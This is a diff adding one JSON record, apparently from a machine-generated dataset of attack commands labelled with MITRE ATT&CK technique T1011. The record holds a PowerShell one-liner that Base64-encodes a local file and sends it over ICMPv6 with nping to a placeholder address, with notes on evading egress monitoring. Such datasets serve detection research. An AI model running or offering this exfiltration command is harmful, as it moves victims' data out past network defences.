@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
+  "explanation": "Exfiltrates file content over ICMP on IPv6 using Nmap's nping, avoiding typical TCP/HTTP egress. The payload is Base64-encoded to make it less obvious in casual inspection, aligning with T1011 by using a different network medium (ICMP/IPv6) than standard channels.",
+  "rationale_steps": [
+    "Read sensitive file and Base64-encode it for payload transport.",
+    "Send a single ICMPv6 Echo with the encoded data as payload to a non-standard destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-c8f5e0c7",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
